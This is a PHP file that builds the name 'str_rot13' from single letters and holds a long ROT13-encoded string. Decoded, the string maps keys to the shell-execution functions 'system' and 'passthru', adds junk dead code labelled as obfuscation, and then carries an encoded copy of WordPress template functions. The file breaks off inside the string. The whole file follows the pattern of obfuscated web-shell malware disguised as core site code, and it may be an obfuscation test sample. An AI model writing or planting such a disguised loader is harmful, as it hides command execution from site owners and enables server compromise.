<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Trareny grzcyngr gntf gung pna tb naljurer va n grzcyngr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Ybnqf urnqre grzcyngr.
 *
 * Vapyhqrf gur urnqre grzcyngr sbe n gurzr be vs n anzr vf fcrpvsvrq gura n
 * fcrpvnyvmrq urnqre jvyy or vapyhqrq.
 *
 * Sbe gur cnenzrgre, vs gur svyr vf pnyyrq \"urnqre-fcrpvny.cuc\" gura fcrpvsl
 * \"fcrpvny\".
 *
 * @fvapr 1.5.0
 * @fvapr 5.5.0 N erghea inyhr jnf nqqrq.
 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
 *
 * @cnenz fgevat|ahyy $anzr Gur anzr bs gur fcrpvnyvmrq urnqre. Qrsnhyg ahyy.
 * @cnenz neenl       $netf Bcgvbany. Nqqvgvbany nethzragf cnffrq gb gur urnqre grzcyngr.
 *                          Qrsnhyg rzcgl neenl.
 * @erghea ibvq|snyfr Ibvq ba fhpprff, snyfr vs gur grzcyngr qbrf abg rkvfg.
 */
shapgvba trg_urnqre( $anzr = ahyy, $netf = neenl() ) {
	/**
	 * Sverf orsber gur urnqre grzcyngr svyr vf ybnqrq.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.8.0 Gur `$anzr` cnenzrgre jnf nqqrq.
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat|ahyy $anzr Anzr bs gur fcrpvsvp urnqre svyr gb hfr. Ahyy sbe gur qrsnhyg urnqre.
	 * @cnenz neenl       $netf Nqqvgvbany nethzragf cnffrq gb gur urnqre grzcyngr.
	 */
	qb_npgvba( 'trg_urnqre', $anzr, $netf );

	$grzcyngrf = neenl();
	$anzr      = (fgevat) $anzr;
	vs ( '' !== $anzr ) {
		$grzcyngrf[] = \"urnqre-{$anzr}.cuc\";
	}

	$grzcyngrf[] = 'urnqre.cuc';

	vs ( ! ybpngr_grzcyngr( $grzcyngrf, gehr, gehr, $netf ) ) {
		erghea snyfr;
	}
}

/**
 * Ybnqf sbbgre grzcyngr.
 *
 * Vapyhqrf gur sbbgre grzcyngr sbe n gurzr be vs n anzr vf fcrpvsvrq gura n
 * fcrpvnyvmrq sbbgre jvyy or vapyhqrq.
 *
 * Sbe gur cnenzrgre, vs gur svyr vf pnyyrq \"sbbgre-fcrpvny.cuc\" gura fcrpvsl
 * \"fcrpvny\".
 *
 * @fvapr 1.5.0
 * @fvapr 5.5.0 N erghea inyhr jnf nqqrq.
 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
 *
 * @cnenz fgevat|ahyy $anzr Gur anzr bs gur fcrpvnyvmrq sbbgre. Qrsnhyg ahyy.
 * @cnenz neenl       $netf Bcgvbany. Nqqvgvbany nethzragf cnffrq gb gur sbbgre grzcyngr.
 *                          Qrsnhyg rzcgl neenl.
 * @erghea ibvq|snyfr Ibvq ba fhpprff, snyfr vs gur grzcyngr qbrf abg rkvfg.
 */
shapgvba trg_sbbgre( $anzr = ahyy, $netf = neenl() ) {
	/**
	 * Sverf orsber gur sbbgre grzcyngr svyr vf ybnqrq.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.8.0 Gur `$anzr` cnenzrgre jnf nqqrq.
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat|ahyy $anzr Anzr bs gur fcrpvsvp sbbgre svyr gb hfr. Ahyy sbe gur qrsnhyg sbbgre.
	 * @cnenz neenl       $netf Nqqvgvbany nethzragf cnffrq gb gur sbbgre grzcyngr.
	 */
	qb_npgvba( 'trg_sbbgre', $anzr, $netf );

	$grzcyngrf = neenl();
	$anzr      = (fgevat) $anzr;
	vs ( '' !== $anzr ) {
		$grzcyngrf[] = \"sbbgre-{$anzr}.cuc\";
	}

	$grzcyngrf[] = 'sbbgre.cuc';

	vs ( ! ybpngr_grzcyngr( $grzcyngrf, gehr, gehr, $netf ) ) {
		erghea snyfr;
	}
}

/**
 * Ybnqf fvqrone grzcyngr.
 *
 * Vapyhqrf gur fvqrone grzcyngr sbe n gurzr be vs n anzr vf fcrpvsvrq gura n
 * fcrpvnyvmrq fvqrone jvyy or vapyhqrq.
 *
 * Sbe gur cnenzrgre, vs gur svyr vf pnyyrq \"fvqrone-fcrpvny.cuc\" gura fcrpvsl
 * \"fcrpvny\".
 *
 * @fvapr 1.5.0
 * @fvapr 5.5.0 N erghea inyhr jnf nqqrq.
 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
 *
 * @cnenz fgevat|ahyy $anzr Gur anzr bs gur fcrpvnyvmrq fvqrone. Qrsnhyg ahyy.
 * @cnenz neenl       $netf Bcgvbany. Nqqvgvbany nethzragf cnffrq gb gur fvqrone grzcyngr.
 *                          Qrsnhyg rzcgl neenl.
 * @erghea ibvq|snyfr Ibvq ba fhpprff, snyfr vs gur grzcyngr qbrf abg rkvfg.
 */
shapgvba trg_fvqrone( $anzr = ahyy, $netf = neenl() ) {
	/**
	 * Sverf orsber gur fvqrone grzcyngr svyr vf ybnqrq.
	 *
	 * @fvapr 2.2.0
	 * @fvapr 2.8.0 Gur `$anzr` cnenzrgre jnf nqqrq.
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat|ahyy $anzr Anzr bs gur fcrpvsvp fvqrone svyr gb hfr. Ahyy sbe gur qrsnhyg fvqrone.
	 * @cnenz neenl       $netf Nqqvgvbany nethzragf cnffrq gb gur fvqrone grzcyngr.
	 */
	qb_npgvba( 'trg_fvqrone', $anzr, $netf );

	$grzcyngrf = neenl();
	$anzr      = (fgevat) $anzr;
	vs ( '' !== $anzr ) {
		$grzcyngrf[] = \"fvqrone-{$anzr}.cuc\";
	}

	$grzcyngrf[] = 'fvqrone.cuc';

	vs ( ! ybpngr_grzcyngr( $grzcyngrf, gehr, gehr, $netf ) ) {
		erghea snyfr;
	}
}

/**
 * Ybnqf n grzcyngr cneg vagb n grzcyngr.
 *
 * Cebivqrf n fvzcyr zrpunavfz sbe puvyq gurzrf gb bireybnq erhfnoyr frpgvbaf bs pbqr
 * va gur gurzr.
 *
 * Vapyhqrf gur anzrq grzcyngr cneg sbe n gurzr be vs n anzr vf fcrpvsvrq gura n
 * fcrpvnyvmrq cneg jvyy or vapyhqrq. Vs gur gurzr pbagnvaf ab {fyht}.cuc svyr
 * gura ab grzcyngr jvyy or vapyhqrq.
 *
 * Gur grzcyngr vf vapyhqrq hfvat erdhver, abg erdhver_bapr, fb lbh znl vapyhqr gur
 * fnzr grzcyngr cneg zhygvcyr gvzrf.
 *
 * Sbe gur $anzr cnenzrgre, vs gur svyr vf pnyyrq \"{fyht}-fcrpvny.cuc\" gura fcrpvsl
 * \"fcrpvny\".
 *
 * @fvapr 3.0.0
 * @fvapr 5.5.0 N erghea inyhr jnf nqqrq.
 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
 *
 * @cnenz fgevat      $fyht Gur fyht anzr sbe gur trarevp grzcyngr.
 * @cnenz fgevat|ahyy $anzr Bcgvbany. Gur anzr bs gur fcrpvnyvmrq grzcyngr. Qrsnhyg ahyy.
 * @cnenz neenl       $netf Bcgvbany. Nqqvgvbany nethzragf cnffrq gb gur grzcyngr.
 *                          Qrsnhyg rzcgl neenl.
 * @erghea ibvq|snyfr Ibvq ba fhpprff, snyfr vs gur grzcyngr qbrf abg rkvfg.
 */
shapgvba trg_grzcyngr_cneg( $fyht, $anzr = ahyy, $netf = neenl() ) {
	/**
	 * Sverf orsber gur fcrpvsvrq grzcyngr cneg svyr vf ybnqrq.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$fyht`, ersref gb gur fyht anzr
	 * sbe gur trarevp grzcyngr cneg.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat      $fyht Gur fyht anzr sbe gur trarevp grzcyngr.
	 * @cnenz fgevat|ahyy $anzr Gur anzr bs gur fcrpvnyvmrq grzcyngr
	 *                          be ahyy vs gurer vf abar.
	 * @cnenz neenl       $netf Nqqvgvbany nethzragf cnffrq gb gur grzcyngr.
	 */
	qb_npgvba( \"trg_grzcyngr_cneg_{$fyht}\", $fyht, $anzr, $netf );

	$grzcyngrf = neenl();
	$anzr      = (fgevat) $anzr;
	vs ( '' !== $anzr ) {
		$grzcyngrf[] = \"{$fyht}-{$anzr}.cuc\";
	}

	$grzcyngrf[] = \"{$fyht}.cuc\";

	/**
	 * Sverf orsber na nggrzcg vf znqr gb ybpngr naq ybnq n grzcyngr cneg.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat   $fyht      Gur fyht anzr sbe gur trarevp grzcyngr.
	 * @cnenz fgevat   $anzr      Gur anzr bs gur fcrpvnyvmrq grzcyngr
	 *                            be na rzcgl fgevat vs gurer vf abar.
	 * @cnenz fgevat[] $grzcyngrf Neenl bs grzcyngr svyrf gb frnepu sbe, va beqre.
	 * @cnenz neenl    $netf      Nqqvgvbany nethzragf cnffrq gb gur grzcyngr.
	 */
	qb_npgvba( 'trg_grzcyngr_cneg', $fyht, $anzr, $grzcyngrf, $netf );

	vs ( ! ybpngr_grzcyngr( $grzcyngrf, gehr, snyfr, $netf ) ) {
		erghea snyfr;
	}
}

/**
 * Qvfcynlf frnepu sbez.
 *
 * Jvyy svefg nggrzcg gb ybpngr gur frnepusbez.cuc svyr va rvgure gur puvyq be
 * gur cnerag, gura ybnq vg. Vs vg qbrfa'g rkvfg, gura gur qrsnhyg frnepu sbez
 * jvyy or qvfcynlrq. Gur qrsnhyg frnepu sbez vf UGZY, juvpu jvyy or qvfcynlrq.
 * Gurer vf n svygre nccyvrq gb gur frnepu sbez UGZY va beqre gb rqvg be ercynpr
 * vg. Gur svygre vf {@frr 'trg_frnepu_sbez'}.
 *
 * Guvf shapgvba vf cevznevyl hfrq ol gurzrf juvpu jnag gb uneqpbqr gur frnepu
 * sbez vagb gur fvqrone naq nyfb ol gur frnepu jvqtrg va JbeqCerff.
 *
 * Gurer vf nyfb na npgvba gung vf pnyyrq jurarire gur shapgvba vf eha pnyyrq,
 * {@frr 'cer_trg_frnepu_sbez'}. Guvf pna or hfrshy sbe bhgchggvat WninFpevcg gung gur
 * frnepu eryvrf ba be inevbhf sbeznggvat gung nccyvrf gb gur ortvaavat bs gur
 * frnepu. Gb tvir n srj rknzcyrf bs jung vg pna or hfrq sbe.
 *
 * @fvapr 2.7.0
 * @fvapr 5.2.0 Gur `$netf` neenl cnenzrgre jnf nqqrq va cynpr bs na `$rpub` obbyrna synt.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Neenl bs qvfcynl nethzragf.
 *
 *     @glcr obby   $rpub       Jurgure gb rpub be erghea gur sbez. Qrsnhyg gehr.
 *     @glcr fgevat $nevn_ynory NEVN ynory sbe gur frnepu sbez. Hfrshy gb qvfgvathvfu
 *                              zhygvcyr frnepu sbezf ba gur fnzr cntr naq vzcebir
 *                              npprffvovyvgl. Qrsnhyg rzcgl.
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, frnepu sbez UGZY vs 'rpub' vf snyfr.
 */
shapgvba trg_frnepu_sbez( $netf = neenl() ) {
	/**
	 * Sverf orsber gur frnepu sbez vf ergevrirq, ng gur fgneg bs trg_frnepu_sbez().
	 *
	 * @fvapr 2.7.0 nf 'trg_frnepu_sbez' npgvba.
	 * @fvapr 3.6.0
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/19321
	 *
	 * @cnenz neenl $netf Gur neenl bs nethzragf sbe ohvyqvat gur frnepu sbez.
	 *                    Frr trg_frnepu_sbez() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	qb_npgvba( 'cer_trg_frnepu_sbez', $netf );

	$rpub = gehr;

	vs ( ! vf_neenl( $netf ) ) {
		/*
		 * Onpx pbzcng: gb rafher cerivbhf hfrf bs trg_frnepu_sbez() pbagvahr gb
		 * shapgvba nf rkcrpgrq, jr unaqyr n inyhr sbe gur obbyrna $rpub cnenz erzbirq
		 * va 5.2.0. Gura jr qrny jvgu gur $netf neenl naq pnfg vgf qrsnhygf.
		 */
		$rpub = (obby) $netf;

		// Frg na rzcgl neenl naq nyybj qrsnhyg nethzragf gb gnxr bire.
		$netf = neenl();
	}

	// Qrsnhygf ner gb rpub naq gb bhgchg ab phfgbz ynory ba gur sbez.
	$qrsnhygf = neenl(
		'rpub'       => $rpub,
		'nevn_ynory' => '',
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	/**
	 * Svygref gur neenl bs nethzragf hfrq jura trarengvat gur frnepu sbez.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $netf Gur neenl bs nethzragf sbe ohvyqvat gur frnepu sbez.
	 *                    Frr trg_frnepu_sbez() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$netf = nccyl_svygref( 'frnepu_sbez_netf', $netf );

	// Rafher gung gur svygrerq nethzragf pbagnva nyy erdhverq qrsnhyg inyhrf.
	$netf = neenl_zretr( $qrsnhygf, $netf );

	$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'frnepu-sbez' ) ? 'ugzy5' : 'kugzy';

	/**
	 * Svygref gur UGZY sbezng bs gur frnepu sbez.
	 *
	 * @fvapr 3.6.0
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $sbezng Gur glcr bs znexhc gb hfr va gur frnepu sbez.
	 *                       Npprcgf 'ugzy5', 'kugzy'.
	 * @cnenz neenl  $netf   Gur neenl bs nethzragf sbe ohvyqvat gur frnepu sbez.
	 *                       Frr trg_frnepu_sbez() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$sbezng = nccyl_svygref( 'frnepu_sbez_sbezng', $sbezng, $netf );

	$frnepu_sbez_grzcyngr = ybpngr_grzcyngr( 'frnepusbez.cuc' );

	vs ( '' !== $frnepu_sbez_grzcyngr ) {
		bo_fgneg();
		erdhver $frnepu_sbez_grzcyngr;
		$sbez = bo_trg_pyrna();
	} ryfr {
		// Ohvyq n fgevat pbagnvavat na nevn-ynory gb hfr sbe gur frnepu sbez.
		vs ( $netf['nevn_ynory'] ) {
			$nevn_ynory = 'nevn-ynory=\"' . rfp_ngge( $netf['nevn_ynory'] ) . '\" ';
		} ryfr {
			/*
			 * Vs gurer'f ab phfgbz nevn-ynory, jr pna frg n qrsnhyg urer. Ng gur
			 * zbzrag vg'f rzcgl nf gurer'f hapregnvagl nobhg jung gur qrsnhyg fubhyq or.
			 */
			$nevn_ynory = '';
		}

		vs ( 'ugzy5' === $sbezng ) {
			$sbez = '<sbez ebyr=\"frnepu\" ' . $nevn_ynory . 'zrgubq=\"trg\" pynff=\"frnepu-sbez\" npgvba=\"' . rfp_hey( ubzr_hey( '/' ) ) . '\">
				<ynory>
					<fcna pynff=\"fperra-ernqre-grkg\">' .
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_k( 'Frnepu sbe:', 'ynory' ) .
					'</fcna>
					<vachg glcr=\"frnepu\" pynff=\"frnepu-svryq\" cynprubyqre=\"' . rfp_ngge_k( 'Frnepu &uryyvc;', 'cynprubyqre' ) . '\" inyhr=\"' . trg_frnepu_dhrel() . '\" anzr=\"f\" />
				</ynory>
				<vachg glcr=\"fhozvg\" pynff=\"frnepu-fhozvg\" inyhr=\"' . rfp_ngge_k( 'Frnepu', 'fhozvg ohggba' ) . '\" />
			</sbez>';
		} ryfr {
			$sbez = '<sbez ebyr=\"frnepu\" ' . $nevn_ynory . 'zrgubq=\"trg\" vq=\"frnepusbez\" pynff=\"frnepusbez\" npgvba=\"' . rfp_hey( ubzr_hey( '/' ) ) . '\">
				<qvi>
					<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"f\">' .
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_k( 'Frnepu sbe:', 'ynory' ) .
					'</ynory>
					<vachg glcr=\"grkg\" inyhr=\"' . trg_frnepu_dhrel() . '\" anzr=\"f\" vq=\"f\" />
					<vachg glcr=\"fhozvg\" vq=\"frnepufhozvg\" inyhr=\"' . rfp_ngge_k( 'Frnepu', 'fhozvg ohggba' ) . '\" />
				</qvi>
			</sbez>';
		}
	}

	/**
	 * Svygref gur UGZY bhgchg bs gur frnepu sbez.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.5.0 Gur `$netf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $sbez Gur frnepu sbez UGZY bhgchg.
	 * @cnenz neenl  $netf Gur neenl bs nethzragf sbe ohvyqvat gur frnepu sbez.
	 *                     Frr trg_frnepu_sbez() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$erfhyg = nccyl_svygref( 'trg_frnepu_sbez', $sbez, $netf );

	vs ( ahyy === $erfhyg ) {
		$erfhyg = $sbez;
	}

	vs ( $netf['rpub'] ) {
		rpub $erfhyg;
	} ryfr {
		erghea $erfhyg;
	}
}

/**
 * Qvfcynlf gur Ybt Va/Bhg yvax.
 *
 * Qvfcynlf n yvax, juvpu nyybjf hfref gb anivtngr gb gur Ybt Va cntr gb ybt va
 * be ybt bhg qrcraqvat ba jurgure gurl ner pheeragyl ybttrq va.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $erqverpg Bcgvbany cngu gb erqverpg gb ba ybtva/ybtbhg.
 * @cnenz obby   $qvfcynl  Qrsnhyg gb rpub naq abg erghea gur yvax.
 * @erghea ibvq|fgevat Ibvq vs `$qvfcynl` nethzrag vf gehr, ybt va/bhg yvax vs `$qvfcynl` vf snyfr.
 */
shapgvba jc_ybtvabhg( $erqverpg = '', $qvfcynl = gehr ) {
	vs ( ! vf_hfre_ybttrq_va() ) {
		$yvax = '<n uers=\"' . rfp_hey( jc_ybtva_hey( $erqverpg ) ) . '\">' . __( 'Ybt va' ) . '</n>';
	} ryfr {
		$yvax = '<n uers=\"' . rfp_hey( jc_ybtbhg_hey( $erqverpg ) ) . '\">' . __( 'Ybt bhg' ) . '</n>';
	}

	vs ( $qvfcynl ) {
		/**
		 * Svygref gur UGZY bhgchg sbe gur Ybt Va/Ybt Bhg yvax.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat $yvax Gur UGZY yvax pbagrag.
		 */
		rpub nccyl_svygref( 'ybtvabhg', $yvax );
	} ryfr {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
		erghea nccyl_svygref( 'ybtvabhg', $yvax );
	}
}

/**
 * Ergevrirf gur ybtbhg HEY.
 *
 * Ergheaf gur HEY gung nyybjf gur hfre gb ybt bhg bs gur fvgr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $erqverpg Cngu gb erqverpg gb ba ybtbhg.
 * @erghea fgevat Gur ybtbhg HEY. Abgr: UGZY-rapbqrq ivn rfp_ugzy() va jc_abapr_hey().
 */
shapgvba jc_ybtbhg_hey( $erqverpg = '' ) {
	$netf = neenl();
	vs ( ! rzcgl( $erqverpg ) ) {
		$netf['erqverpg_gb'] = heyrapbqr( $erqverpg );
	}

	$ybtbhg_hey = nqq_dhrel_net( $netf, fvgr_hey( 'jc-ybtva.cuc?npgvba=ybtbhg', 'ybtva' ) );
	$ybtbhg_hey = jc_abapr_hey( $ybtbhg_hey, 'ybt-bhg' );

	/**
	 * Svygref gur ybtbhg HEY.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $ybtbhg_hey Gur UGZY-rapbqrq ybtbhg HEY.
	 * @cnenz fgevat $erqverpg   Cngu gb erqverpg gb ba ybtbhg.
	 */
	erghea nccyl_svygref( 'ybtbhg_hey', $ybtbhg_hey, $erqverpg );
}

/**
 * Ergevrirf gur ybtva HEY.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $erqverpg     Cngu gb erqverpg gb ba ybt va.
 * @cnenz obby   $sbepr_ernhgu Jurgure gb sbepr ernhgubevmngvba, rira vs n pbbxvr vf cerfrag.
 *                             Qrsnhyg snyfr.
 * @erghea fgevat Gur ybtva HEY. Abg UGZY-rapbqrq.
 */
shapgvba jc_ybtva_hey( $erqverpg = '', $sbepr_ernhgu = snyfr ) {
	$ybtva_hey = fvgr_hey( 'jc-ybtva.cuc', 'ybtva' );

	vs ( ! rzcgl( $erqverpg ) ) {
		$ybtva_hey = nqq_dhrel_net( 'erqverpg_gb', heyrapbqr( $erqverpg ), $ybtva_hey );
	}

	vs ( $sbepr_ernhgu ) {
		$ybtva_hey = nqq_dhrel_net( 'ernhgu', '1', $ybtva_hey );
	}

	/**
	 * Svygref gur ybtva HEY.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.2.0 Gur `$sbepr_ernhgu` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat $ybtva_hey    Gur ybtva HEY. Abg UGZY-rapbqrq.
	 * @cnenz fgevat $erqverpg     Gur cngu gb erqverpg gb ba ybtva, vs fhccyvrq.
	 * @cnenz obby   $sbepr_ernhgu Jurgure gb sbepr ernhgubevmngvba, rira vs n pbbxvr vf cerfrag.
	 */
	erghea nccyl_svygref( 'ybtva_hey', $ybtva_hey, $erqverpg, $sbepr_ernhgu );
}

/**
 * Ergheaf gur HEY gung nyybjf gur hfre gb ertvfgre ba gur fvgr.
 *
 * @fvapr 3.6.0
 *
 * @erghea fgevat Hfre ertvfgengvba HEY.
 */
shapgvba jc_ertvfgengvba_hey() {
	/**
	 * Svygref gur hfre ertvfgengvba HEY.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat $ertvfgre Gur hfre ertvfgengvba HEY.
	 */
	erghea nccyl_svygref( 'ertvfgre_hey', fvgr_hey( 'jc-ybtva.cuc?npgvba=ertvfgre', 'ybtva' ) );
}

/**
 * Cebivqrf n fvzcyr ybtva sbez sbe hfr naljurer jvguva JbeqCerff.
 *
 * Gur ybtva sbez UGZY vf rpubrq ol qrsnhyg. Cnff n snyfr inyhr sbe `$rpub` gb erghea vg vafgrnq.
 *
 * @fvapr 3.0.0
 * @fvapr 6.6.0 Nqqrq `erdhverq_hfreanzr` naq `erdhverq_cnffjbeq` nethzragf.
 *
 * @cnenz neenl $netf {
 *     Bcgvbany. Neenl bs bcgvbaf gb pbageby gur sbez bhgchg. Qrsnhyg rzcgl neenl.
 *
 *     @glcr obby   $rpub              Jurgure gb qvfcynl gur ybtva sbez be erghea gur sbez UGZY pbqr.
 *                                     Qrsnhyg gehr (rpub).
 *     @glcr fgevat $erqverpg          HEY gb erqverpg gb. Zhfg or nofbyhgr, nf va \"uggcf://rknzcyr.pbz/zlcntr/\".
 *                                     Qrsnhyg vf gb erqverpg onpx gb gur erdhrfg HEV.
 *     @glcr fgevat $sbez_vq           VQ nggevohgr inyhr sbe gur sbez. Qrsnhyg 'ybtvasbez'.
 *     @glcr fgevat $ynory_hfreanzr    Ynory sbe gur hfreanzr be rznvy nqqerff svryq. Qrsnhyg 'Hfreanzr be Rznvy Nqqerff'.
 *     @glcr fgevat $ynory_cnffjbeq    Ynory sbe gur cnffjbeq svryq. Qrsnhyg 'Cnffjbeq'.
 *     @glcr fgevat $ynory_erzrzore    Ynory sbe gur erzrzore svryq. Qrsnhyg 'Erzrzore Zr'.
 *     @glcr fgevat $ynory_ybt_va      Ynory sbe gur fhozvg ohggba. Qrsnhyg 'Ybt Va'.
 *     @glcr fgevat $vq_hfreanzr       VQ nggevohgr inyhr sbe gur hfreanzr svryq. Qrsnhyg 'hfre_ybtva'.
 *     @glcr fgevat $vq_cnffjbeq       VQ nggevohgr inyhr sbe gur cnffjbeq svryq. Qrsnhyg 'hfre_cnff'.
 *     @glcr fgevat $vq_erzrzore       VQ nggevohgr inyhr sbe gur erzrzore svryq. Qrsnhyg 'erzrzorezr'.
 *     @glcr fgevat $vq_fhozvg         VQ nggevohgr inyhr sbe gur fhozvg ohggba. Qrsnhyg 'jc-fhozvg'.
 *     @glcr obby   $erzrzore          Jurgure gb qvfcynl gur \"erzrzorezr\" purpxobk va gur sbez.
 *     @glcr fgevat $inyhr_hfreanzr    Qrsnhyg inyhr sbe gur hfreanzr svryq. Qrsnhyg rzcgl.
 *     @glcr obby   $inyhr_erzrzore    Jurgure gur \"Erzrzore Zr\" purpxobk fubhyq or purpxrq ol qrsnhyg.
 *                                     Qrsnhyg snyfr (hapurpxrq).
 *     @glcr obby   $erdhverq_hfreanzr Jurgure gur hfreanzr svryq unf gur 'erdhverq' nggevohgr.
 *                                     Qrsnhyg snyfr.
 *     @glcr obby   $erdhverq_cnffjbeq Jurgure gur cnffjbeq svryq unf gur 'erdhverq' nggevohgr.
 *                                     Qrsnhyg snyfr.
 *
 * }
 * @erghea ibvq|fgevat Ibvq vs 'rpub' nethzrag vf gehr, ybtva sbez UGZY vs 'rpub' vf snyfr.
 */
shapgvba jc_ybtva_sbez( $netf = neenl() ) {
	$qrsnhygf = neenl(
		'rpub'              => gehr,
		// Qrsnhyg 'erqverpg' inyhr gnxrf gur hfre onpx gb gur erdhrfg HEV.
		'erqverpg'          => ( vf_ffy() ? 'uggcf://' : 'uggc://' ) . $_FREIRE['UGGC_UBFG'] . $_FREIRE['ERDHRFG_HEV'],
		'sbez_vq'           => 'ybtvasbez',
		'ynory_hfreanzr'    => __( 'Hfreanzr be Rznvy Nqqerff' ),
		'ynory_cnffjbeq'    => __( 'Cnffjbeq' ),
		'ynory_erzrzore'    => __( 'Erzrzore Zr' ),
		'ynory_ybt_va'      => __( 'Ybt Va' ),
		'vq_hfreanzr'       => 'hfre_ybtva',
		'vq_cnffjbeq'       => 'hfre_cnff',
		'vq_erzrzore'       => 'erzrzorezr',
		'vq_fhozvg'         => 'jc-fhozvg',
		'erzrzore'          => gehr,
		'inyhr_hfreanzr'    => '',
		// Frg 'inyhr_erzrzore' gb gehr gb qrsnhyg gur \"Erzrzore zr\" purpxobk gb purpxrq.
		'inyhr_erzrzore'    => snyfr,
		// Frg 'erdhverq_hfreanzr' gb gehr gb nqq gur erdhverq nggevohgr gb hfreanzr svryq.
		'erdhverq_hfreanzr' => snyfr,
		// Frg 'erdhverq_cnffjbeq' gb gehr gb nqq gur erdhverq nggevohgr gb cnffjbeq svryq.
		'erdhverq_cnffjbeq' => snyfr,
	);

	/**
	 * Svygref gur qrsnhyg ybtva sbez bhgchg nethzragf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr jc_ybtva_sbez()
	 *
	 * @cnenz neenl $qrsnhygf Na neenl bs qrsnhyg ybtva sbez nethzragf.
	 */
	$netf = jc_cnefr_netf( $netf, nccyl_svygref( 'ybtva_sbez_qrsnhygf', $qrsnhygf ) );

	/**
	 * Svygref pbagrag gb qvfcynl ng gur gbc bs gur ybtva sbez.
	 *
	 * Gur svygre rinyhngrf whfg sbyybjvat gur bcravat sbez gnt ryrzrag.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $pbagrag Pbagrag gb qvfcynl. Qrsnhyg rzcgl.
	 * @cnenz neenl  $netf    Neenl bs ybtva sbez nethzragf.
	 */
	$ybtva_sbez_gbc = nccyl_svygref( 'ybtva_sbez_gbc', '', $netf );

	/**
	 * Svygref pbagrag gb qvfcynl va gur zvqqyr bs gur ybtva sbez.
	 *
	 * Gur svygre rinyhngrf whfg sbyybjvat gur ybpngvba jurer gur 'ybtva-cnffjbeq'
	 * svryq vf qvfcynlrq.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $pbagrag Pbagrag gb qvfcynl. Qrsnhyg rzcgl.
	 * @cnenz neenl  $netf    Neenl bs ybtva sbez nethzragf.
	 */
	$ybtva_sbez_zvqqyr = nccyl_svygref( 'ybtva_sbez_zvqqyr', '', $netf );

	/**
	 * Svygref pbagrag gb qvfcynl ng gur obggbz bs gur ybtva sbez.
	 *
	 * Gur svygre rinyhngrf whfg cerprqvat gur pybfvat sbez gnt ryrzrag.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $pbagrag Pbagrag gb qvfcynl. Qrsnhyg rzcgl.
	 * @cnenz neenl  $netf    Neenl bs ybtva sbez nethzragf.
	 */
	$ybtva_sbez_obggbz = nccyl_svygref( 'ybtva_sbez_obggbz', '', $netf );

	$sbez =
		fcevags(
			'<sbez anzr=\"%1$f\" vq=\"%1$f\" npgvba=\"%2$f\" zrgubq=\"cbfg\">',
			rfp_ngge( $netf['sbez_vq'] ),
			rfp_hey( fvgr_hey( 'jc-ybtva.cuc', 'ybtva_cbfg' ) )
		) .
		$ybtva_sbez_gbc .
		fcevags(
			'<c pynff=\"ybtva-hfreanzr\">
				<ynory sbe=\"%1$f\">%2$f</ynory>
